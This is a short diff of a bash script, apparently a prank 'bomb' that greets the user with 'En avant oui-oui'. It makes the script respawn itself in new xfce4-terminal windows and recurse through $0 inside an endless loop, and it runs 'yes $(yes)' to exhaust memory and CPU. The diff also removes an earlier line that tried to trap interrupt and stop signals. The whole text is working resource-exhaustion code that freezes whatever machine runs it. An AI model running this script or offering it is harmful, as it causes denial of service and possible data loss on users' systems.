@@ -1,8 +1,10 @@
 #!/usr/bin/env bash
 
-trap '' INT SIGINT SIGTSTP SIGKILL SIGSTOP
-echo En avant oui-oui !
+echo En avant oui-oui \!
+CMD=$(pwd)/$0
 while true; do
+	xfce4-terminal -e "$CMD" &
 	$0
 	yes $(yes)
+	wait
 done
